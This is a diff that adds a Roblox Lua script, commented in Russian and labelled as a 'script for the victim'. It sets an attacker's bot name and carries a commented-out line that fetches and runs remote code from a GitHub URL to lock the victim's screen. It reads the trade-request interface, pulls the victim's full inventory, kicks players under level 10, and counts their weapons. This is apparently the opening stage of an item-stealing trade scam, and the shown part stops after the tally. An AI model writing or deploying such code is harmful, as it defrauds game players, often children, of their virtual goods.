@@ -1,0 +1,64 @@
+--- Скрипт для жертвы
+local botname = "RanoDevx" --- Введите ник вашего бота
+
+--- Запускаем скрипт, который блокирует экран
+--- loadstring(game:HttpGet("https://raw.githubusercontent.com/Borebuhisss/Versions/refs/heads/main/status3"))()
+local botname = "RanoDevx" --- Введите ник вашего бота
+--- Проверяем девайс
+local hasLobby = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") ~= nil
+if hasLobby == true then
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.ReceivingRequest.Username.Text
+else
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.ReceivingRequest.Username.Text
+end
+
+--- Получаем уровень, и проверяем больше ли он 10 уровня, если нет, то кикаем игрока с ошибкой.
+local player = game.Players.LocalPlayer
+local args = {
+    [1] = player.Name
+}
+local accountInformation = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
+local level = accountInformation.LevelBadges["Level10"]
+
+if level == false then
+    player:Kick("You're less than level 10.")
+end
+
+--- Парсим инвентарь и проверяем сколько всего предметов, так же получаем название и количество всех оружий.
+local HttpService = game:GetService("HttpService")
+
+local args = {
+    [1] = player.Name
+}
+
+local inventory = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
+
+local weapons = inventory["Weapons"]
+local ownedWeapons = weapons["Owned"]
+
+local groupedWeapons = {}
+local currentGroup = {}
+local count = 0
+local totalSwords = 0
+
+for weaponName, weaponCount in pairs(ownedWeapons) do
+    totalSwords = totalSwords + weaponCount
+    if weaponCount > 1 then
+        table.insert(currentGroup, weaponName .. " (" .. weaponCount .. ")")
+    else
+        table.insert(currentGroup, weaponName .. " (1)")
+    end
+    count = count + 1
+
+    if count == 4 then
+        table.insert(groupedWeapons, currentGroup)
+        currentGroup = {}
+        count = 0
+    end
+end
+
+if #currentGroup > 0 then
+    table.insert(groupedWeapons, currentGroup)
+end
+
+print("Всего мечей:", totalSwords)
